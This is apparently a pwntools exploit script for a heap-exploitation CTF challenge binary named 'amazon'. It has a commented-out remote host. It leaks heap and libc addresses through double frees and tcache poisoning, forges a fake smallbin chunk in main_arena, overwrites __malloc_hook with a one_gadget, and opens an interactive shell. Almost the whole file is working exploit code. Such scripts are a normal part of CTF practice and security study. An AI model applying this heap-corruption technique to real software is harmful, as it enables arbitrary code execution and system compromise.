from pwn import *

#context.log_level = 'debug'

p = process('./amazon')
#p=remote("121.41.38.38",9999)
libc=ELF("./libc-2.27.so")

def g(p,data=False):
    gdb.attach(p,data)
    raw_input()

def ru(x):
    return p.recvuntil(x)
    
def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def rl():
    return p.recvline()

def re(x):
    return p.recv(x)

def add(idx,price,length,data):
	ru("Your choice: ")
	sl(str(1))
	ru("uy: ")
	sl(str(idx))
	ru("many: ")
	sl(str(price))
	ru("note: ")
	sl(str(length))
	ru("tent: ")
	se(data)

def add2(idx,price,length):
	ru("Your choice: ")
	sl(str(1))
	ru("uy: ")
	sl(str(idx))
	ru("many: ")
	sl(str(price))
	ru("note: ")
	sl(str(length))

def show():
	ru("Your choice: ")
	sl(str(2))

def free(idx):
	ru("Your choice: ")
	sl(str(3))
	ru("for: ")
	sl(str(idx))

add(1,0x10,0x90,"1"*8) #chunk0 (leak_main_arena)
add(1,0x10,0x80,p64(0)) #chunk1 (There's a fake chunk in it.)
free(1)
add(1,0x10,0x30,"3"*8) #chunk2 (dotcache poisoning)  ## chunk1 can overflow  to chunk2
free(2)
add(1,0x10,0x20,"4"*8)
add(1,0x10,0x20,"2"*8)
free(0)
free(0)
show()
ru("Name: ")
heap=u64(re(6).ljust(8,"\x00"))-0x260
print hex(heap)

for i in range(6):
    free(0)

show()
ru("Name: ")
lib=u64(re(6).ljust(8,"\x00"))-0x3ebca0
print hex(lib)

hook=libc.symbols["__malloc_hook"]
hook=lib+hook
print hex(hook)
one=lib+0x10a38c
realloc=lib+libc.symbols["realloc"]

add(1,0x10,0x80,"y"*0x60+p64(0)+p64(0x51)+p64(lib+0x3ebce0)*2) # malloc to chunk1 (set fake_chunk and its fd bk -> small bin[3]_head)

add(1,0x10,0x90,"1"*8)  # malloc padding 

add(1,0x10,0x90,p64(lib+0x3ebcb0)*2+p64(lib+0x3ebcc0)*2+p64(lib+0x3ebcd0)*2+p64(heap+0x340+0x60)*2) ## malloc to main_arena to modify smallbin[3] to fake_chunk
add(1,0x10,0x20,p64(hook-0x28))  ## malloc to fake_chunk, edit£¬and overflow to chunk2 
add(1,0x10,0x30,"wwe")

add(1,0x10,0x30,p64(one)+p64(realloc+0x9))

add2(1,1,0x60)

p.interactive()

